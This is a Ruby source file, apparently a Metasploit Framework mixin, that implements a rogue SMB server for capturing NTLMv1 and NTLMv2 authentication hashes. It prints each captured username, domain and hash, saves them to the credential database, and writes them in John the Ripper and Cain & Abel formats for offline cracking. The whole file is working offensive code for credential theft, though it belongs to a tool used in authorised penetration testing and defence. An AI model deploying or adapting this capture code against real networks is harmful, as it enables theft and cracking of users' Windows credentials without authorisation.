module Msf

  ###
  #
  # This mixin provides
  #
  ###

  module Exploit::SMBHashCapture

    include ::Msf::Auxiliary::Report

    def handle_datastore_options(datastore, ntlm_provider)
      if datastore['CHALLENGE']
        # Set challenge for all future server responses

        chall = proc { [datastore['CHALLENGE']].pack('H*') }
        ntlm_provider.generate_server_challenge(&chall)
      end

      if datastore['JOHNPWFILE']
        print_status("JTR hashes will be split into two files depending on the hash format.")
        print_status("#{build_jtr_file_name(JTR_NTLMV1)} for NTLMv1 hashes.")
        print_status("#{build_jtr_file_name(JTR_NTLMV2)} for NTLMv2 hashes.")
        print_line
      end

      if datastore['CAINPWFILE']
        print_status("Cain & Abel hashes will be stored at #{File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root)}")
        print_line
      end
    end

    def on_cred(creds)
      if active_db?
        origin = create_credential_origin_service(
          {
            address: creds[:address],
            port: datastore['SRVPORT'],
            service_name: 'smb',
            protocol: 'tcp',
            module_fullname: fullname,
            workspace_id: myworkspace_id
          }
        )

        # TODO: Re-implement when +creds[:client_os_version]+ can be determined.
        # found_host = framework.db.hosts.find_by(address: address)
        # found_host.os_name = creds[:client_os_version]
        # found_host.save!

        create_credential(
          {
            origin: origin,
            origin_type: :service,
            address: creds[:address],
            service_name: 'smb',
            port: datastore['SRVPORT'],
            private_data: creds[:combined_hash],
            private_type: :nonreplayable_hash,
            jtr_format: creds[:jtr_format],
            username: creds[:username],
            module_fullname: fullname,
            workspace_id: myworkspace_id,
            realm_key: creds[:realm_key],
            realm_value: creds[:realm_value]
          }
        )
      end

      if datastore['JOHNPWFILE']
        path = build_jtr_file_name(creds[:jtr_format])

        File.open(path, 'ab') do |f|
          f.puts(creds[:combined_hash])
        end
      end

      # Cain & Abel doesn't support import of NTLMv2 hashes
      if datastore['CAINPWFILE'] && creds[:jtr_format] == JTR_NTLMV1
        # Cain&Abel hash format
        # Username:Domain:Challenge:LMHash:NTLMHash
        File.open(File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root), 'ab') do |f|
          f.puts("#{creds[:username]}:#{creds[:domain]}:#{creds[:server_challenge]}:#{creds[:client_hash]}")
        end
      end
    end

    def build_jtr_file_name(jtr_format)
      # JTR NTLM hash format NTLMv1
      # Username::Domain:LMHash:NTHash:Challenge
      #
      # JTR NTLM hash format NTLMv2
      # Username::Domain:Challenge:NTHash[0...16]:NTHash[16...-1]

      path = File.expand_path(datastore['JOHNPWFILE'], Msf::Config.install_root)

      # if the passed file name does not contain an extension
      if File.extname(File.basename(path)).empty?
        path += "_#{jtr_format}"
      else
        path_parts = path.split('.')

        # inserts _jtr_format between the last extension and the rest of the path
        path = "#{path_parts[0...-1].join('.')}_#{jtr_format}.#{path_parts[-1]}"
      end

      path
    end


    class HashCaptureNTLMProvider < RubySMB::Gss::Provider::NTLM
      def initialize(allow_anonymous: false, default_domain: 'WORKGROUP', listener: nil)
        super(allow_anonymous: allow_anonymous, default_domain: default_domain)
        @listener = listener
      end

      # Needs overwritten to ensure our version of Authenticator is returned
      def new_authenticator(server_client)
        # build and return an instance that can process and track stateful information for a particular connection but
        # that's backed by this particular provider
        HashCaptureAuthenticator.new(self, server_client)
      end

      attr_reader :listener
    end

    class HashCaptureAuthenticator < RubySMB::Gss::Provider::NTLM::Authenticator
      def bin_to_hex(str)
        str.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
      end

      def process_ntlm_type1(type1_msg)
        @client_os_version = type1_msg.os_version
        # TODO: write method for mapping +major+ and +minor+ OS values to human-readable OS names.
        # @client_os_version = ::NTLM::OSVersion.read(type1_msg.os_version)
        super
      end

      def process_ntlm_type3(type3_msg)
        _, client = ::Socket.unpack_sockaddr_in(@server_client.getpeername)

        hash_type = nil
        combined_hash = "#{type3_msg.user.encode}::#{type3_msg.domain.encode}"

        case type3_msg.ntlm_version
        when :ntlmv1
          hash_type = 'NTLMv1-SSP'
          client_hash = "#{bin_to_hex(type3_msg.lm_response)}:#{bin_to_hex(type3_msg.ntlm_response)}"

          combined_hash << ":#{client_hash}"
          combined_hash << ":#{bin_to_hex(@server_challenge)}"
        when :ntlmv2
          hash_type = 'NTLMv2-SSP'
          client_hash = "#{bin_to_hex(type3_msg.ntlm_response[0...16])}:#{bin_to_hex(type3_msg.ntlm_response[16..-1])}"

          combined_hash << ":#{bin_to_hex(@server_challenge)}"
          combined_hash << ":#{client_hash}"
        end

        unless hash_type.nil?
          @provider.listener.print_line "[SMB] #{hash_type} Client     : #{client}"
          # @provider.listener.print_line "[SMB] #{hash_type} Client OS  : #{@client_os_version}"
          @provider.listener.print_line "[SMB] #{hash_type} Username   : #{type3_msg.domain.encode}\\#{type3_msg.user.encode}"
          @provider.listener.print_line "[SMB] #{hash_type} Hash       : #{combined_hash}"
          @provider.listener.print_line

          if @provider.listener
            jtr_format = type3_msg.ntlm_version == :ntlmv1 ? JTR_NTLMV1 : JTR_NTLMV2
            @provider.listener.on_cred(
              {
                address: client,
                combined_hash: combined_hash,
                jtr_format: jtr_format,
                username: type3_msg.user.encode,
                server_challenge: @server_challenge,
                client_hash: client_hash,
                domain: type3_msg.domain.encode,
                client_os_version: @client_os_version,
                realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
                realm_value: type3_msg.domain.encode
              }
            )
          end
        end

        ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
      end
    end
  end

end
